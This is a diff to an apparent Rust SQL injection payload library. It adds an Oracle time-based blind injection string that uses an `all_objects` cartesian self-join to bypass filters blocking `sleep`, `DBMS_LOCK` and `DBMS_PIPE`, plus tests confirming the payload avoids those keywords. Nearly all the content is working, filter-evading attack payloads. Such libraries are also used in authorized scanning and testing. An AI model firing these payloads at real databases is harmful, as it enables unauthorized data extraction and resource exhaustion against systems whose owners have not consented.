@@ -10,6 +10,16 @@ pub fn oracle_time_lock(secs: u64) -> String {
     format!("' AND DBMS_LOCK.SLEEP({secs}) --")
 }
 
+/// Heavy-query variant without `DBMS_PIPE`/`DBMS_LOCK` (P0-5): filtered
+/// stacks that reject `sleep` still run dictionary cartesian joins. An
+/// `all_objects` self-join multiplies rows quadratically, burning seconds
+/// of CPU. Fixed cost; caller keeps `sleep_secs` for threshold math, same
+/// contract as the MySQL fixed `BENCHMARK`.
+#[must_use]
+pub fn oracle_time_heavy() -> String {
+    "' AND (SELECT COUNT(*) FROM all_objects A, all_objects B)>0 --".to_owned()
+}
+
 /// Canonical Oracle error-based set — legacy first (compat), then variants.
 ///
 /// - `[0]` legacy `CTXSYS.DRITHSX.SN` — banner leak channel
@@ -42,5 +52,17 @@ mod tests {
     #[test]
     fn lock_shape() {
         assert_eq!(oracle_time_lock(5), "' AND DBMS_LOCK.SLEEP(5) --");
+    }
+
+    #[test]
+    fn heavy_has_no_sleep_keyword() {
+        // P0-5: dictionary cartesian burn passes `sleep` filters.
+        let p = oracle_time_heavy();
+        assert_eq!(
+            p,
+            "' AND (SELECT COUNT(*) FROM all_objects A, all_objects B)>0 --"
+        );
+        assert!(!p.to_ascii_lowercase().contains("sleep"), "{p}");
+        assert!(!p.contains("DBMS_PIPE"), "{p}");
     }
 }
